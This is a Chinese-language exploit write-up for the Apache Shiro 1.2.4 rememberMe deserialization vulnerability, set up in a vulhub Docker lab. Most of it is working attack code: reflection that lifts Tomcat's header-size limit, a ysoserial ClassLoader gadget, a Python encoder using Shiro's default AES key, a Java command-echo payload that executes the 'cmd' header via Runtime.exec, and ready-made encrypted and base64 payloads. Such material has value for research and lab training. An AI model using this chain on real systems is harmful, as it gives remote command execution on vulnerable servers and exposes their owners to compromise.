# Shiro漏洞分析合集

## shiro ClassLoader 命令回显

### 靶场搭建

```yaml
version: '2'
services:
 web:
   image: vulhub/shiro:1.2.4
   ports:
    - "8080:8080"
```
启动docker `docker-compose up`

### 漏洞利用

shiro在漏洞利用的时候，需要在header头发送payload，反序列化的poc数据包超过中间件的`maxHeaderSize`的时候，就会返回错误。

各类中间件默认配置的header头大小

| 中间价 | Header Size        |
| ------ | ------------------ |
| Apache | 8K                 |
| IIS    | 16K                |
| Nginx  | 4-8k               |
| Tomcat | 8-48K ( <7.0 48k ) |

`tomcat-coyote.jar!/org/apache/coyote/http11/AbstractHttp11Protocol.class`

```java
public abstract class AbstractHttp11Protocol<S> extends AbstractProtocol<S> {
    private int socketBuffer = 9000;
    private int maxSavePostSize = 4096;
    private int maxHttpHeaderSize = 8192; // 限制了header头大小
    private int connectionUploadTimeout = 300000;
    private boolean disableUploadTimeout = true;
    private String compression = "off";
    private String noCompressionUserAgents = null;
    private String compressibleMimeTypes = "text/html,text/xml,text/plain,text/css,text/javascript,application/javascript";
    private int compressionMinSize = 2048;
    private String restrictedUserAgents = null;
    private String server;
    private int maxTrailerSize = 8192;
    private int maxExtensionSize = 8192;
    private int maxSwallowSize = 2097152;
    private boolean secure;
    private int upgradeAsyncWriteBufferSize = 8192;
    private Set<String> allowedTrailerHeaders = Collections.newSetFromMap(new ConcurrentHashMap());
```

想要突破http头大小的限制，目前有2种方式

1. 通过反射修改http头大小
2. 修改poc体积，满足小于8k的要求

### 反射修改Header头

```java
try{
      java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context"); 
      java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service"); 
      contextField.setAccessible(true); 
      serviceField.setAccessible(true); 
      org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = 
              (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); 
      org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext()); 
      org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext); 
      org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors(); 
      for (int i=0;i<connectors.length;i++) { 
          if (4==connectors[i].getScheme().length()) { 
              org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler(); 
             if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
              ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("header头大小"); 
             }
          } 
      }  
}catch (Exception e){
      
}
```

调整Header头大小后，并发发送Payload即可。

### 调整payload大小

缩减体积可参考 https://xz.aliyun.com/t/6227?page=1 这里就不多说了



### ClassLoader绕过Header头限制

ClassLoader就是类加载器，将class文件加载到jvm虚拟机中运行。

利用思路:

在request中接收post传参(bs64) -> bs64解码 -> classloader加载回显payload

在java中获取request对象，保证在同一线程中

spring

```java
HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();
```

Struts

```java
HttpServletRequest request = ServletActionContext.getRequest();
```



在执行反序列化的时候执行自定义的java代码，借助`TemplatesImpl` , 编写ysoserial的扩展。

```java
package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class MyClassLoader extends AbstractTranslet {
   static{
       try{
           javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
           java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
           r.setAccessible(true);
           org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
           javax.servlet.http.HttpSession session = request.getSession();

           String classData=request.getParameter("classData");
           System.out.println(classData);

           byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
           java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
           defineClassMethod.setAccessible(true);
           Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
           cc.newInstance().equals(new Object[]{request,response,session});
      }catch(Exception e){
           e.printStackTrace();
      }
  }
   public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
  }
   public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
  }
}
```

ysoserial的Gadget.java加入代码

```java
    public static <T> T createTemplatesImpl(Class c) throws Exception {
        Class<T> tplClass = null;

        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            tplClass = (Class<T>) Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        }else{
            tplClass = (Class<T>) TemplatesImpl.class;
        }

        final T templates = tplClass.newInstance();
        final byte[] classBytes = ClassFiles.classAsBytes(c);

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes
        });

        Reflections.setFieldValue(templates, "_name", "Pwnr");
        return templates;
    }
```

根据Gadget新增不同的文件，修改

```java
        final Object templates = Gadgets.createTemplatesImpl(cmd);
```

```java
        final Object templates = Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);
```

生成ClassLoader 命令回显POC

```shell
╭─huakai at huakai-deMacBook-Pro in ⌁/Desktop/work/tools/ysoserial (master ●5✚10…49)
╰─λ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader "" > classload.ser   
╭─huakai at huakai-deMacBook-Pro in ⌁/Desktop/work/tools/ysoserial (master ●5✚10…49)
╰─λ cat classload.ser|python shiro_encode.py                                                                                                                                  0 < 00:00:00 < 16:29:41
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
```

shiro_encode.py 代码

```python
import sys
import os
import sys
import uuid
import base64
import subprocess
import argparse
from Crypto.Cipher import AES
def encode_rememberme():
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    test = uuid.uuid4()
    iv = test.bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(sys.stdin.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
print(encode_rememberme())
```

通用命令回显代码

```java
package aa;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Scanner;

public class dfs_classloader {

    static HashSet<Object> h;
    static ClassLoader cl = Thread.currentThread().getContextClassLoader();
    static Class hsr;//HTTPServletRequest.class
    static Class hsp;//HTTPServletResponse.class
    static String cmd;
    static Object r;
    static Object p;

    //    static {
//  r = null;
    //   p = null;
    // h =new HashSet<Object>();
    // F(Thread.currentThread(),0);
//    }
    public dfs_classloader()
    //static
    {
        // System.out.println("start");
        r = null;
        p = null;
        h =new HashSet<Object>();
        try {
            hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
            hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

        F(Thread.currentThread(),0);
    }

    private static boolean i(Object obj){
        if(obj==null|| h.contains(obj)){
            return true;
        }

        h.add(obj);
        return false;
    }
    private static void p(Object o, int depth){
        if(depth > 52||(r !=null&& p !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null&&hsr.isAssignableFrom(o.getClass())){
                r = o;
                //Tomcat特殊处理
                try {
                    cmd = (String)hsr.getMethod("getHeader",new Class[]{String.class}).invoke(o,"cmd");
                    if(cmd==null) {
                        r = null;
                    }else{
                        System.out.println("find Request");
                        try {
                            Method getResponse = r.getClass().getMethod("getResponse");
                            p = getResponse.invoke(r);
                        } catch (Exception e) {
                            System.out.println("getResponse Error");
                            r=null;
//                            e.printStackTrace();
                        }
                    }
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                }

            }else if(p ==null&&hsp.isAssignableFrom(o.getClass())){
                p =  o;
            }
            if(r !=null&& p !=null){
                try {
                    PrintWriter pw =  (PrintWriter)hsp.getMethod("getWriter").invoke(p);
                    pw.println("~3b712de48137572f3849aabd5666a4e3~");
                    pw.println(new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
                    pw.println("~3b712de48137572f3849aabd5666a4e3~");

                    pw.flush();
                    pw.close();
                    //p.addHeader("out",new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
                }catch (Exception e){
                }
                return;
            }

            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){

        Class n=start.getClass();
        do{
            for (Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                Object o = null;
                try{
                    o = declaredField.get(start);

                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        for (Object q : (Object[]) o) {
                            p(q, depth);
                        }

                    }

                }catch (Exception e){
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }
}
```



javac编译代码, base64文件内容

```shell
╭─huakai at huakai-deMacBook-Pro in ⌁/Desktop/work/vuln_debug/EchoTest/src/main/java/aa
╰─λ javac dfs_classloader.java -Xlint:unchecked   
╭─huakai at huakai-deMacBook-Pro in ⌁/Desktop/work/vuln_debug/EchoTest/src/main/java/aa
╰─λ cat dfs_classloader.class |base64                                                                                                                                         0 < 00:00:00 < 16:34:20
yv66vgAAADQA2woAGgBlCQBAAGYJAEAAZwcAaAoABABlCQBAAGkJAEAAaggAawoAbABtCQBAAG4IAG8JAEAAcAcAcQoADQByCgBzAHQKAEAAdQoABAB2CgAEAHcKAEAAeAoAGgB5CgAXAHoIAHsHAHwHAH0KABcAfgcAfwgASgoAgACBCQBAAIIJAIMAhAgAhQoAhgCHCACIBwCJCACKBwCLCgAkAHIHAIwKACYAcgcAjQoAKAByCACOBwCPCACQCgArAIcHAJEKAJIAkwoAkgCUCgCVAJYKAC4AlwgAmAoALgCZCgAuAJoKACsAmwoAKwCcCgAXAJ0KAJ4AnwoAngCgCgAXAKEKAEAAogcAowoAFwCkCgBzAKUHAKYBAAFoAQATTGphdmEvdXRpbC9IYXNoU2V0OwEACVNpZ25hdHVyZQEAJ0xqYXZhL3V0aWwvSGFzaFNldDxMamF2YS9sYW5nL09iamVjdDs+OwEAAmNsAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAANoc3IBABFMamF2YS9sYW5nL0NsYXNzOwEAA2hzcAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAXIBABJMamF2YS9sYW5nL09iamVjdDsBAAFwAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAKYHAHEBAAFpAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAWKExqYXZhL2xhbmcvT2JqZWN0O0kpVgcAiQcAiwcAjAcAjQEAAUYHAHwHAKcHAKgHAH8BAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABRkZnNfY2xhc3Nsb2FkZXIuamF2YQwATwBQDABMAE0MAE4ATQEAEWphdmEvdXRpbC9IYXNoU2V0DABBAEIMAEUARgEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QHAKkMAKoAqwwARwBIAQAmamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVzcG9uc2UMAEkASAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDACsAFAHAK0MAK4ArwwAXQBYDACwAFcMALEAVwwAVgBXDACyALMMALQAtQEACWdldEhlYWRlcgEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9TdHJpbmcMALYAtwEAEGphdmEvbGFuZy9PYmplY3QHALgMALkAugwASgBLBwC7DAC8AL0BAAxmaW5kIFJlcXVlc3QHAL4MAL8AwAEAC2dldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWdldFJlc3BvbnNlIEVycm9yAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEACWdldFdyaXRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACJ+M2I3MTJkZTQ4MTM3NTcyZjM4NDlhYWJkNTY2NmE0ZTN+AQARamF2YS91dGlsL1NjYW5uZXIHAMEMAMIAwwwAxADFBwDGDADHAMgMAE8AyQEAAlxBDADKAMsMAMwAzQwAzgBQDADPAFAMANAA0QcAqAwA0gDTDADUANUMANYA1wwATgBYAQATW0xqYXZhL2xhbmcvT2JqZWN0OwwA2ACzDADZANoBABJhYS9kZnNfY2xhc3Nsb2FkZXIBABpbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAAhjb250YWlucwEAA2FkZAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAFZmx1c2gBAAVjbG9zZQEAEWdldERlY2xhcmVkRmllbGRzAQAcKClbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdpc0FycmF5AQADKClaAQANZ2V0U3VwZXJjbGFzcwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsAIQBAABoAAAAHAAgAQQBCAAEAQwAAAAIARAAIAEUARgAAAAgARwBIAAAACABJAEgAAAAIAEoASwAAAAgATABNAAAACABOAE0AAAAFAAEATwBQAAEAUQAAAJoAAgACAAAAPCq3AAEBswACAbMAA7sABFm3AAWzAAayAAcSCLYACbMACrIABxILtgAJswAMpwAITCu2AA64AA8DuAAQsQABABYALAAvAA0AAgBSAAAALgALAAAAHAAEAB4ACAAfAAwAIAAWACIAIQAjACwAJgAvACQAMAAlADQAKAA7ACkAUwAAABAAAv8ALwABBwBUAAEHAFUEAAoAVgBXAAEAUQAAAEgAAgABAAAAGirGAA2yAAYqtgARmQAFBKyyAAYqtgASVwOsAAAAAgBSAAAAEgAEAAAALAAOAC0AEAAwABgAMQBTAAAABAACDgEACgBOAFgAAQBRAAACMQAGAAMAAAEwGxA0owAPsgACxgAKsgADxgAEsSq4ABOaARiyAALHAJayAAoqtgAUtgAVmQCJKrMAArIAChIWBL0AF1kDEhhTtgAZKgS9ABpZAxIbU7YAHMAAGLMAHbIAHccACgGzAAKnADmyAB4SH7YAILIAArYAFBIhA70AF7YAGU0ssgACA70AGrYAHLMAA6cAEE2yAB4SI7YAIAGzAAKnADJNLLYAJacAKk0stgAnpwAiTSy2ACmnABqyAAPHABSyAAwqtgAUtgAVmQAHKrMAA7IAAsYAW7IAA8YAVbIADBIqA70AF7YAGbIAAwO9ABq2ABzAACtNLBIstgAtLLsALlm4AC+yAB22ADC2ADG3ADISM7YANLYANbYALSwSLLYALSy2ADYstgA3pwAETbEqGwRguAAQsQAFAGoAiACLACIAMQCYAJsAJAAxAJgAowAmADEAmACrACgA1gEjASYAIgACAFIAAACeACcAAAA0ABIANQATADcAGgA4AC0AOQAxADwAVQA9AFsAPgBiAEAAagBCAHoAQwCIAEgAiwBEAIwARQCUAEYAmABQAJsASgCcAEsAoABQAKMATACkAE0AqABQAKsATgCsAE8AsABQALMAUgDGAFMAygBVANYAVwDwAFgA9gBZARUAWgEbAFwBHwBdASMAYAEmAF8BJwBhASgAZAEvAGYAUwAAACMADhIA+wBOaAcAWQxCBwBaRwcAW0cHAFwHFvcAWwcAWQAABgAKAF0AWAABAFEAAAEUAAIADAAAAIQqtgAUTSy2ADhOLb42BAM2BRUFFQSiAGUtFQUyOgYZBgS2ADkBOgcZBiq2ADo6BxkHtgAUtgA7mgAMGQcbuAA8pwAvGQfAAD3AAD06CBkIvjYJAzYKFQoVCaIAFhkIFQoyOgsZCxu4ADyECgGn/+mnAAU6CIQFAaf/miy2AD5ZTcf/hbEAAQAnAG8AcgAiAAIAUgAAAEIAEAAAAGkABQBrAB4AbAAkAG0AJwBvAC8AcQA6AHIAQwB0AGMAdQBpAHQAbwB7AHIAegB0AGsAegB+AHsAfwCDAIEAUwAAAC4ACPwABQcAXv4ACwcAXwEB/QAxBwBgBwBh/gARBwA9AQH4ABlCBwBZ+QAB+AAFAAgAYgBQAAEAUQAAACIAAQAAAAAACrgAD7YAP7MAB7EAAAABAFIAAAAGAAEAAAANAAEAYwAAAAIAZA==
```

成功命令回显，由于classloader的payload文件小，满足小于8k的条件

![成功回显](../../images/java/shiro/1.png)

### PSF案例

